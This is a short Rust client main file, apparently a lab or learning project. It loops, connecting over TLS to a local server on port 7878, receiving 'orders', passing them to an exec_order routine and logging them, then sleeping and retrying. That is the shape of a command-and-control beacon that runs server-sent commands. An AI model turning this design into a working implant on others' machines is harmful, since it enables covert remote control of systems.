
mod ssl_builder;
mod handle_connection;
mod make_one_string;
mod write_order;
mod exec_order;

use std::net::TcpStream;
use std::process::Command;

// use std::io::prelude::*;


fn main() {

    loop {
    
        let connector = ssl_builder::ssl_builder();
        
        if let Ok(stream) = TcpStream::connect("127.0.0.1:7878") {
            
            let stream = connector.connect("127.0.0.1",stream).unwrap();

            println!("Could connect to server!");
            
            let contents = handle_connection::handle_connection(stream);

            let content_as_string = make_one_string::make_one_string(contents.clone());

            exec_order::exec_order(contents); // TODO

            write_order::write_order(content_as_string);

            println!("End of connection \n");


        } else {
            println!("Couldn't connect to socket. Is the server is up ?");
        }

        let _ = Command::new("sleep")
            .args(["5"]).output();
    }

}





// Reference https://doc.rust-lang.org/std/net/struct.TcpStream.html
